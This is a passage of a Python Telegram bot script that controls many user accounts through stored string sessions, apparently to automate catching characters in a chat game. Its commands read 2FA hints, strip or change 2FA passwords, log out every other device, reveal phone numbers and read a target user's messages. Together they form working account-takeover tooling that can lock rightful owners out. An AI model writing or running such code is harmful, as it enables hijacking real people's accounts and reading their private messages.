            await event.reply(f"👀 **Peeking @{target_username.lstrip('@')} via selfbot `{target_uid}`...**\nThis may take a while (up to {PEEK_LIMIT} msgs).")
            asyncio.create_task(perform_peek(target_uid, target_username, event.chat_id))

        # ---------- /idsave ----------
        elif cmd == "/idsave":
            if not args:
                await event.reply("⚠️ **Usage:** `/idsave {selfbot_user_id}`")
                return
            try:
                target_uid = int(args.split()[0])
            except ValueError:
                await event.reply("❌ **User ID must be a number**")
                return
            if target_uid not in userbot_instances:
                await event.reply(f"❌ **Selfbot `{target_uid}` is not online**")
                return
            bot_state["selected_user_id"] = target_uid
            await event.reply(f"✅ **Selected selfbot:** `{target_uid}`\nNow run `/save on`.")

        # ---------- /save ----------
        elif cmd == "/save":
            if not bot_state["selected_user_id"]:
                await event.reply("⚠️ **Run `/idsave {user_id}` first.**")
                return
            target_uid = bot_state["selected_user_id"]
            if args.lower() == "on":
                bot_state["save_mode"] = True
                await event.reply(f"📥 **Save mode ON** for `{target_uid}`\nSend IDs (one per line).\nSend `/save off` when done.")
            elif args.lower() == "off":
                bot_state["save_mode"] = False
                doc = await cgift_ids_col.find_one({"user_id": target_uid})
                total = len(doc.get("ids", [])) if doc else 0
                await event.reply(f"📤 **Save mode OFF**\n📊 Total: `{total}`")
            else:
                await event.reply("⚠️ **Usage:** `/save on` or `/save off`")

        # ---------- /clean ----------
        elif cmd == "/clean":
            if not bot_state["selected_user_id"]:
                await event.reply("⚠️ **Run `/idsave {user_id}` first.**")
                return
            target_uid = bot_state["selected_user_id"]
            bot_state["save_mode"] = False
            doc = await cgift_ids_col.find_one({"user_id": target_uid})
            count = len(doc.get("ids", [])) if doc else 0
            await cgift_ids_col.delete_one({"user_id": target_uid})
            if target_uid in cgift_state:
                cgift_state[target_uid]["index"] = 0
                cgift_state[target_uid]["running"] = False
            await event.reply(f"🗑️ **Cleaned all saved IDs for `{target_uid}`**\n📊 Deleted: `{count}`")

        # ---------- /passhint ----------
        elif cmd == "/passhint":
            if not args:
                await event.reply("⚠️ **Usage:** `/passhint [User_ID]`")
                return
            try:
                target_uid = int(args.split()[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            if target_uid not in userbot_instances:
                await event.reply("❌ **Userbot not found.**")
                return
            try:
                client = userbot_instances[target_uid]["client"]
                pwd = await client(GetPasswordRequest())
                if not pwd.has_password:
                    await event.reply(f"ℹ️ **`{target_uid}` has NO 2FA password set.**")
                else:
                    hint = pwd.hint if pwd.hint else "(no hint set)"
                    await event.reply(f"🔐 **2FA Info for `{target_uid}`**\n💡 **Hint:** `{hint}`")
            except Exception as e:
                await event.reply(f"❌ **Error:** {e}")

        # ---------- /resetpass ----------
        elif cmd == "/resetpass":
            if not args:
                await event.reply("⚠️ **Usage:** `/resetpass [User_ID]`")
                return
            try:
                target_uid = int(args.split()[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            if target_uid not in userbot_instances:
                await event.reply("❌ **Userbot not found.**")
                return
            try:
                client = userbot_instances[target_uid]["client"]
                result = await client(ResetPasswordRequest())
                result_type = type(result).__name__
                if result_type == "ResetPasswordOk":
                    await event.reply(f"✅ **2FA password removed** for `{target_uid}`")
                elif result_type == "ResetPasswordFailedWait":
                    await event.reply(f"⏳ **Wait until {result.retry_date}** then run again.")
                elif result_type == "ResetPasswordRequestedWait":
                    await event.reply(f"⏳ **Reset in progress.** Wait until **{result.until_date}** then run again.")
                else:
                    await event.reply(f"❓ Unknown response: {result}")
            except Exception as e:
                await event.reply(f"❌ **Error:** {e}")

        # ---------- /delpass ----------
        elif cmd == "/delpass":
            if not PasswordInputSettings or not InputCheckPasswordSRP:
                await event.reply("❌ **2FA types not available in this Telethon version.**")
                return
            parts = args.split(maxsplit=1)
            if len(parts) < 2:
                await event.reply("⚠️ **Usage:** `/delpass [User_ID] [CurrentPassword]`")
                return
            try:
                target_uid = int(parts[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            current_password = parts[1]
            if target_uid not in userbot_instances:
                await event.reply("❌ **Userbot not found.**")
                return
            try:
                client = userbot_instances[target_uid]["client"]
                pwd = await client(GetPasswordRequest())
                if not pwd.has_password:
                    await event.reply("ℹ️ **No password set.**")
                    return
                check = compute_srp_check(current_password, pwd.current_algo, pwd.srp_B, pwd.srp_id)
                new_settings = PasswordInputSettings(
                    new_algo=pwd.new_algo, new_password_hash=b'', hint="", email=""
                )
                await client(UpdatePasswordSettingsRequest(password=check, new_settings=new_settings))
                await event.reply(f"✅ **2FA password REMOVED for `{target_uid}`**")
            except Exception as e:
                await event.reply(f"❌ **Failed:** {e}")

        # ---------- /changepass ----------
        elif cmd == "/changepass":
            if not PasswordInputSettings or not InputCheckPasswordSRP or not InputCheckPasswordEmpty:
                await event.reply("❌ **2FA types not available in this Telethon version.**")
                return
            parts = args.split(maxsplit=2)
            if len(parts) < 3:
                await event.reply("⚠️ **Usage:** `/changepass [User_ID] [OldPass] [NewPass]`")
                return
            try:
                target_uid = int(parts[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            old_pwd, new_pwd = parts[1], parts[2]
            if target_uid not in userbot_instances:
                await event.reply("❌ **Userbot not found.**")
                return
            try:
                client = userbot_instances[target_uid]["client"]
                pwd = await client(GetPasswordRequest())
                if not pwd.has_password:
                    new_hash = new_pwd_hash(new_pwd, pwd.new_algo)
                    new_settings = PasswordInputSettings(
                        new_algo=pwd.new_algo, new_password_hash=new_hash, hint="", email=""
                    )
                    await client(UpdatePasswordSettingsRequest(
                        password=InputCheckPasswordEmpty(), new_settings=new_settings
                    ))
                    await event.reply(f"✅ **2FA password SET for `{target_uid}`**")
                else:
                    check = compute_srp_check(old_pwd, pwd.current_algo, pwd.srp_B, pwd.srp_id)
                    new_hash = new_pwd_hash(new_pwd, pwd.new_algo)
                    new_settings = PasswordInputSettings(
                        new_algo=pwd.new_algo, new_password_hash=new_hash, hint="", email=""
                    )
                    await client(UpdatePasswordSettingsRequest(password=check, new_settings=new_settings))
                    await event.reply(f"✅ **2FA password CHANGED for `{target_uid}`**")
            except Exception as e:
                await event.reply(f"❌ **Failed:** {e}")

        # ---------- /addautospecial ----------  (UNCHANGED)
        elif cmd == "/addautospecial":
            if not event.is_private:
                await event.reply("⚠️ **Please use this command in the bot's DM.**")
                return
            parts = args.split(maxsplit=1)
            if len(parts) < 1:
                await event.reply("⚠️ **Usage:** `/addautospecial [Collection] [Session]`")
                return
            col_name = parts[0].strip()
            session_str = parts[1].strip() if len(parts) > 1 else None
            if not session_str and event.is_reply:
                r = await event.get_reply_message()
                if r and r.text:
                    session_str = r.text.strip()
            if not session_str:
                await event.reply("❌ **String Session not found.**")
                return
            await event.reply(f"⏳ Checking and saving into `db['{col_name}']`...")
            try:
                temp_client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
                await temp_client.start()
                me = await temp_client.get_me()
                u_id = me.id
                temp_client.tg_user_id = u_id
                spawn_group = SPECIAL_SPAWN_GROUP
                spawn_groups = list(SPECIAL_SPAWN_GROUPS)
                hint_bot_id = SPECIAL_HINT_BOT_ID
                ignored_emojis = ["🔵", "🟣", "🟡", "🟠", "💮"]
                custom_col = db[col_name]
                await custom_col.update_one(
                    {"user_id": u_id},
                    {"$set": {
                        "user_id": u_id, "session": session_str,
                        "group_id": spawn_group, "ignored_emojis": ignored_emojis,
                        "is_stopped": False, "collection_name": col_name,
                        "special_mode": True,
                        "spawn_group": spawn_group,
                        "spawn_groups": spawn_groups,
                        "hint_bot_id": hint_bot_id,
                        "delay_min": SPECIAL_DELAY_MIN, "delay_max": SPECIAL_DELAY_MAX
                    }},
                    upsert=True
                )
                await registry_col.update_one(
                    {"collection_name": col_name},
                    {"$set": {"collection_name": col_name}},
                    upsert=True
                )
                userbot_instances[u_id] = {
                    "client": temp_client, "group_id": spawn_group,
                    "ignored_emojis": ignored_emojis, "is_stopped": False,
                    "collection_name": col_name, "special_mode": True,
                    "spawn_group": spawn_group,
                    "spawn_groups": spawn_groups,
                    "hint_bot_id": hint_bot_id,
                    "delay_min": SPECIAL_DELAY_MIN, "delay_max": SPECIAL_DELAY_MAX
                }
                register_userbot_handlers(temp_client, spawn_group)

                loaded_userbots.append({
                    "u_id": u_id,
                    "name": me.first_name or "No Name",
                    "username": me.username,
                    "phone": me.phone if me.phone else None,
                    "col_name": col_name,
                    "special_mode": True,
                })

                groups_str = "\n".join(f"   • `{g}`" for g in spawn_groups)
                mention = make_mention(me.first_name or "User", u_id)
                await event.reply(
                    f"✅ **Installed (Special Mode)**\n"
                    f"👤 **Name:** {mention}\n🆔 **User ID:** `{u_id}`\n"
                    f"📱 **Phone:** `{me.phone if me.phone else '—'}`\n"
                    f"📍 **Spawn Groups:**\n{groups_str}\n"
                    f"🤖 **Hint Bot:** `{hint_bot_id}`\n"
                    f"⏱️ **Delay:** {SPECIAL_DELAY_MIN} ~ {SPECIAL_DELAY_MAX} sec\n"
                    f"🗂️ **DB:** `db['{col_name}']`",
                    parse_mode="html"
                )
            except Exception as e:
                await event.reply(f"❌ **Userbot connect failed:** {e}")

        # ---------- /adddm ----------  (DM-Bulk mode)
        elif cmd == "/adddm":
            if not event.is_private:
                await event.reply("⚠️ **Please use this command in the bot's DM.**")
                return
            parts = args.split(maxsplit=1)
            if len(parts) < 1:
                await event.reply("⚠️ **Usage:** `/adddm [Collection] [Session]`")
                return
            col_name = parts[0].strip()
            session_str = parts[1].strip() if len(parts) > 1 else None
            if not session_str and event.is_reply:
                r = await event.get_reply_message()
                if r and r.text:
                    session_str = r.text.strip()
            if not session_str:
                await event.reply("❌ **String Session not found.**")
                return
            await event.reply(f"⏳ Checking DM-Bulk userbot → `db['{col_name}']`...")
            try:
                temp_client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
                await temp_client.start()
                me = await temp_client.get_me()
                u_id = me.id
                temp_client.tg_user_id = u_id
                ignored_emojis = ["🔵", "🟣", "🟡", "🟠", "💮"]  # default blacklist
                spawn_groups = None   # None = all groups
                custom_col = db[col_name]
                await custom_col.update_one(
                    {"user_id": u_id},
                    {"$set": {
                        "user_id": u_id, "session": session_str,
                        "group_id": None, "ignored_emojis": ignored_emojis,
                        "is_stopped": False, "collection_name": col_name,
                        "dm_mode": True,
                        "spawn_group": None,
                        "spawn_groups": spawn_groups,
                        "hint_bot_id": DM_HINT_BOT_ID,
                        "delay_min": SPECIAL_DELAY_MIN, "delay_max": SPECIAL_DELAY_MAX,
                    }},
                    upsert=True
                )
                await registry_col.update_one(
                    {"collection_name": col_name},
                    {"$set": {"collection_name": col_name}},
                    upsert=True
                )
                userbot_instances[u_id] = {
                    "client": temp_client, "group_id": None,
                    "ignored_emojis": ignored_emojis, "is_stopped": False,
                    "collection_name": col_name,
                    "special_mode": False,
                    "dm_mode": True,
                    "spawn_group": None,
                    "spawn_groups": spawn_groups,
                    "hint_bot_id": DM_HINT_BOT_ID,
                    "delay_min": SPECIAL_DELAY_MIN, "delay_max": SPECIAL_DELAY_MAX,
                }
                register_userbot_handlers(temp_client, None)

                loaded_userbots.append({
                    "u_id": u_id,
                    "name": me.first_name or "No Name",
                    "username": me.username,
                    "phone": me.phone if me.phone else None,
                    "col_name": col_name,
                    "special_mode": False,
                    "dm_mode": True,
                })

                mention = make_mention(me.first_name or "User", u_id)
                await event.reply(
                    f"✅ **Installed (DM-Bulk Mode)**\n"
                    f"👤 **Name:** {mention}\n🆔 **User ID:** `{u_id}`\n"
                    f"📱 **Phone:** `{me.phone if me.phone else '—'}`\n"
                    f"📍 **Groups:** ALL\n"
                    f"🚫 **Ignored emojis:** `{' '.join(ignored_emojis)}`\n"
                    f"🤖 **Hint Bot (DM):** `{DM_HINT_BOT_ID}`\n"
                    f"⏱️ **Delay:** {SPECIAL_DELAY_MIN} ~ {SPECIAL_DELAY_MAX} sec\n"
                    f"🗂️ **DB:** `db['{col_name}']`\n"
                    f"💡 Use `/emoji` to change blacklist (single or bulk)",
                    parse_mode="html"
                )
            except Exception as e:
                await event.reply(f"❌ **Userbot connect failed:** {e}")

        # ---------- /addauto ----------  (UNCHANGED)
        elif cmd == "/addauto":
            if not event.is_private:
                await event.reply("⚠️ **Please use this command in the bot's DM.**")
                return
            parts = args.split(maxsplit=2)
            if len(parts) < 2:
                await event.reply("⚠️ **Usage:** `/addauto [Waifu_Chat_ID] [Collection] [Session]`")
                return
            try:
                waifu_chat_id = int(parts[0])
            except ValueError:
                await event.reply("❌ **Waifu Chat ID must be a number.**")
                return
            col_name = parts[1].strip()
            session_str = parts[2].strip() if len(parts) > 2 else None
            if not session_str and event.is_reply:
                r = await event.get_reply_message()
                if r and r.text:
                    session_str = r.text.strip()
            if not session_str:
                await event.reply("❌ **String Session not found.**")
                return
            await event.reply(f"⏳ Checking and saving into `db['{col_name}']`...")
            try:
                temp_client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
                await temp_client.start()
                me = await temp_client.get_me()
                u_id = me.id
                temp_client.tg_user_id = u_id
                default_emojis = ["🔵", "🟣", "🟡", "🟠", "💮"]
                custom_col = db[col_name]
                await custom_col.update_one(
                    {"user_id": u_id},
                    {"$set": {
                        "user_id": u_id, "session": session_str,
                        "group_id": waifu_chat_id, "ignored_emojis": default_emojis,
                        "is_stopped": False, "collection_name": col_name
                    }},
                    upsert=True
                )
                await registry_col.update_one(
                    {"collection_name": col_name},
                    {"$set": {"collection_name": col_name}},
                    upsert=True
                )
                userbot_instances[u_id] = {
                    "client": temp_client, "group_id": waifu_chat_id,
                    "ignored_emojis": default_emojis, "is_stopped": False,
                    "collection_name": col_name
                }
                register_userbot_handlers(temp_client, waifu_chat_id)

                loaded_userbots.append({
                    "u_id": u_id,
                    "name": me.first_name or "No Name",
                    "username": me.username,
                    "phone": me.phone if me.phone else None,
                    "col_name": col_name,
                    "special_mode": False,
                })

                mention = make_mention(me.first_name or "User", u_id)
                await event.reply(
                    f"✅ **Installed**\n👤 **Name:** {mention}\n"
                    f"🆔 **User ID:** `{u_id}`\n"
                    f"📱 **Phone:** `{me.phone if me.phone else '—'}`\n"
                    f"🌐 **Waifu Chat:** `{waifu_chat_id}`\n"
                    f"🗂️ **DB:** `db['{col_name}']`",
                    parse_mode="html"
                )
            except Exception as e:
                await event.reply(f"❌ **Userbot connect failed:** {e}")

        # ---------- /start ----------
        elif cmd == "/start":
            if not args:
                await event.reply("⚠️ **Usage:** `/start [User_ID]`")
                return
            try:
                target_uid = int(args.split()[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            if target_uid in userbot_instances:
                col_name = userbot_instances[target_uid]["collection_name"]
                userbot_instances[target_uid]["is_stopped"] = False
                await db[col_name].update_one({"user_id": target_uid}, {"$set": {"is_stopped": False}})
                await event.reply(f"🚀 **Userbot `{target_uid}` resumed.**")
            else:
                await event.reply("❌ **Userbot not found.**")

        # ---------- /stop ----------
        elif cmd == "/stop":
            if not args:
                await event.reply("⚠️ **Usage:** `/stop [User_ID]`")
                return
            try:
                target_uid = int(args.split()[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            if target_uid in userbot_instances:
                col_name = userbot_instances[target_uid]["collection_name"]
                userbot_instances[target_uid]["is_stopped"] = True
                await db[col_name].update_one({"user_id": target_uid}, {"$set": {"is_stopped": True}})
                await event.reply(f"🛑 **Userbot `{target_uid}` paused.**")
            else:
                await event.reply("❌ **Userbot not found.**")

        # ---------- 🆕 /emoji (SINGLE + BULK) ----------
        elif cmd == "/emoji":
            # ══════════════════════════════════════════
            # 🆕 BULK MODE — reply to a message with user IDs
            # ══════════════════════════════════════════
            if event.is_reply:
                r = await event.get_reply_message()
                if not r or not r.text:
                    await event.reply(
                        "⚠️ **Replied message has no text with user IDs.**"
                    )
                    return

                user_ids = parse_user_ids_from_text(r.text)
                if not user_ids:
                    await event.reply(
                        "⚠️ **No valid user IDs found in replied message.**\n"
                        "Make sure the message contains 6+ digit Telegram IDs."
                    )
                    return

                if not args:
                    await event.reply(
                        "⚠️ **Usage (Bulk):**\n"
                        "Reply to a message with user IDs, then send:\n"
                        "`/emoji 🟡💮`"
                    )
                    return

                custom_emojis = list(args.replace(" ", ""))
                if not custom_emojis:
                    await event.reply("⚠️ **No emojis provided.**")
                    return

                ok_count = 0
                fail_count = 0
                fail_lines = []

                for uid_str in user_ids:
                    try:
                        target_uid = int(uid_str)
                    except ValueError:
                        continue

                    if target_uid not in userbot_instances:
                        fail_count += 1
                        fail_lines.append(f"❌ `{target_uid}` — not online")
                        continue

                    col_name = userbot_instances[target_uid]["collection_name"]
                    userbot_instances[target_uid]["ignored_emojis"] = custom_emojis
                    await db[col_name].update_one(
                        {"user_id": target_uid},
                        {"$set": {"ignored_emojis": custom_emojis}}
                    )
                    ok_count += 1

                emoji_str = " ".join(custom_emojis)
                result = (
                    f"✅ **Bulk /emoji applied**\n"
                    f"🚫 **Ignored:** `{emoji_str}`\n"
                    f"📊 **Total IDs:** `{len(user_ids)}`\n"
                    f"✅ **Updated:** `{ok_count}`\n"
                    f"❌ **Failed:** `{fail_count}`\n"
                )
                if fail_lines:
                    result += "\n**Details:**\n" + "\n".join(fail_lines[:20])
                await event.reply(result)
                return

            # ══════════════════════════════════════════
            # SINGLE MODE — /emoji [user_id] [emojis]
            # ══════════════════════════════════════════
            parts = args.split(maxsplit=1)
            if len(parts) < 2:
                await event.reply(
                    "⚠️ **Usage:**\n"
                    "**Single:** `/emoji [user_id] [emojis]`\n"
                    "**Bulk:** Reply to a message with user IDs, then `/emoji [emojis]`"
                )
                return
            try:
                target_uid = int(parts[0])
                custom_emojis = list(parts[1].replace(" ", ""))
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            if target_uid in userbot_instances:
                col_name = userbot_instances[target_uid]["collection_name"]
                userbot_instances[target_uid]["ignored_emojis"] = custom_emojis
                await db[col_name].update_one({"user_id": target_uid}, {"$set": {"ignored_emojis": custom_emojis}})
                await event.reply(f"✅ **Updated ignored emojis for `{target_uid}`.**\n🚫 `{' '.join(custom_emojis)}`")
            else:
                await event.reply("❌ **Userbot not found.**")

        # ---------- /addhint ----------
        elif cmd == "/addhint":
            if not args:
                await event.reply("⚠️ **Usage:** `/addhint [Hint_Bot_ID]`")
                return
            try:
                h_id = int(args.split()[0])
            except ValueError:
                await event.reply("❌ **Invalid ID.**")
                return
            hint_bot_ids.add(h_id)
            await hint_bots_col.update_one({"hint_id": h_id}, {"$set": {"hint_id": h_id}}, upsert=True)
            await event.reply(f"✅ **Hint Bot `{h_id}` added.**")

        # ---------- /terminate ----------
        elif cmd == "/terminate":
            if not args:
                await event.reply("⚠️ **Usage:** `/terminate [User_ID]`")
                return
            try:
                target_uid = int(args.split()[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            if target_uid in userbot_instances:
                try:
                    client = userbot_instances[target_uid]["client"]
                    await client(functions.auth.ResetAuthorizationsRequest())
                    await event.reply(f"✅ **Other devices terminated for `{target_uid}`.**")
                except Exception as e:
                    await event.reply(f"❌ **Terminate failed:** {e}")
            else:
                await event.reply("❌ **Userbot not found.**")

        # ---------- /phone ----------
        elif cmd == "/phone":
            if not args:
                await event.reply("⚠️ **Usage:** `/phone [User_ID]`")
                return
            try:
                target_uid = int(args.split()[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            if target_uid in userbot_instances:
                try:
                    client = userbot_instances[target_uid]["client"]
                    me = await client.get_me()
                    phone_number = me.phone if me.phone else "No phone set"
                    await event.reply(f"📱 **Phone for `{target_uid}`:** `{phone_number}`")
                except Exception as e:
                    await event.reply(f"❌ **Error:** {e}")
            else:
                await event.reply("❌ **Userbot not found.**")

    except Exception as e:
        print(f"❌ handle_bot_commands error: {e}")
        traceback.print_exc()
        try:
            await event.reply(f"❌ **Command Error:** `{type(e).__name__}: {e}`")
        except Exception:
            pass
        asyncio.create_task(report_error("handle_bot_commands", e, f"cmd={cmd}"))


# ==========================================
# 🚀 STARTUP
# ==========================================
async def startup():
    global userbot_instances, hint_bot_ids
    print("⏳ System starting up...")
    asyncio.create_task(start_dummy_web_server())

    try:
        await bot.start(bot_token=BOT_TOKEN)
        print("🤖 Official Bot connected.")
    except Exception as e:
        print(f"❌ Bot start failed: {e}")
        return

    try:
        await bot.send_message(OWNER_ID, "🟢 **Auto-catch system starting up...**")
    except Exception:
        pass

    async for h_doc in hint_bots_col.find():
        h_id = h_doc.get("hint_id")
        if h_id:
            hint_bot_ids.add(h_id)

    failed_count = 0
    async for reg_doc in registry_col.find():
        col_name = reg_doc.get("collection_name")
        if not col_name:
            continue
        print(f"🗂️ Scanning db['{col_name}'] ...")
        async for acc_doc in db[col_name].find():
            u_id = acc_doc.get("user_id")
            session_str = acc_doc.get("session")
            waifu_chat_id = acc_doc.get("group_id")
            ignored = acc_doc.get("ignored_emojis", ["🔵", "🟣", "🟡", "🟠", "💮"])
            is_shuted = acc_doc.get("is_stopped", False)
            special_mode = acc_doc.get("special_mode", False)
            dm_mode = acc_doc.get("dm_mode", False)

            # ── spawn_groups logic ──
            if dm_mode:
                # DM-Bulk mode listens to ALL groups
                spawn_group = None
                spawn_groups = None
            elif special_mode:
                spawn_group = acc_doc.get("spawn_group")
                spawn_groups = acc_doc.get("spawn_groups")
                if not spawn_groups:
                    spawn_groups = [spawn_group] if spawn_group else list(SPECIAL_SPAWN_GROUPS)
            else:
                spawn_group = None
                spawn_groups = None

            hint_bot_id = acc_doc.get("hint_bot_id") if (special_mode or dm_mode) else None
            if dm_mode and not hint_bot_id:
                hint_bot_id = DM_HINT_BOT_ID

            delay_min = acc_doc.get("delay_min", SPECIAL_DELAY_MIN) if (special_mode or dm_mode) else 0.1
            delay_max = acc_doc.get("delay_max", SPECIAL_DELAY_MAX) if (special_mode or dm_mode) else 0.1

            # DM mode doesn't need a group_id
            if session_str and (waifu_chat_id or special_mode or dm_mode):
                try:
                    client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
                    await client.start()
                    me = await client.get_me()
                    client.tg_user_id = u_id
                    userbot_instances[u_id] = {
                        "client": client,
                        "group_id": waifu_chat_id,
                        "ignored_emojis": ignored,
                        "is_stopped": is_shuted,
                        "collection_name": col_name,
                        "special_mode": special_mode,
                        "dm_mode": dm_mode,
                        "spawn_group": spawn_group,
                        "spawn_groups": spawn_groups,
                        "hint_bot_id": hint_bot_id,
                        "delay_min": delay_min,
                        "delay_max": delay_max,
                    }
                    register_userbot_handlers(client, waifu_chat_id)

                    loaded_userbots.append({
                        "u_id": u_id,
                        "name": me.first_name or "No Name",
                        "username": me.username,
                        "phone": me.phone if me.phone else None,
                        "col_name": col_name,
                        "special_mode": special_mode,
                        "dm_mode": dm_mode,
                    })

                    mode_label = "DM-Bulk" if dm_mode else ("Special" if special_mode else "Normal")
                    print(f"🚀 Loaded {u_id} from db['{col_name}'] (mode={mode_label})")
                except Exception as e:
                    failed_count += 1
                    print(f"⚠️ [BOOT FAIL] {u_id} from db['{col_name}']: {type(e).__name__}: {e}")

    print(f"📊 Total online: {len(userbot_instances)} | Failed: {failed_count}")

    try:
        summary = (
            f"🟢 **Startup complete**\n"
            f"📊 Online userbots: `{len(userbot_instances)}`\n"
            f"❌ Failed: `{failed_count}`\n"
            f"🤖 Hint bots: `{len(hint_bot_ids)}`\n"
            f"📍 Special Spawn Groups: `{len(SPECIAL_SPAWN_GROUPS)}`\n"
            f"💡 Send `/listbots` to see all loaded userbots.\n"
            f"📥 Use `/cmd [collection]` to save sessions in DM.\n"
            f"🎯 Use `/emoji` to set ignored emojis (single or bulk via reply)."
        )
        await bot.send_message(OWNER_ID, summary)
    except Exception:
        pass

    try:
        if loaded_userbots:
            list_msg = await build_loaded_list()
            if len(list_msg) > 4000:
                chunks = []
                cur = ""
                for line in list_msg.split("\n"):
                    if len(cur) + len(line) + 1 > 4000:
                        chunks.append(cur)
                        cur = line
                    else:
                        cur = (cur + "\n" + line) if cur else line
                if cur:
                    chunks.append(cur)
                for ch in chunks:
                    await bot.send_message(OWNER_ID, ch, parse_mode="html")
                    await asyncio.sleep(1)
            else:
                await bot.send_message(OWNER_ID, list_msg, parse_mode="html")
    except Exception as e:
        print(f"⚠️ Failed to send userbot list: {e}")

    print("🤖 Official Bot running...")
    await bot.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(startup())
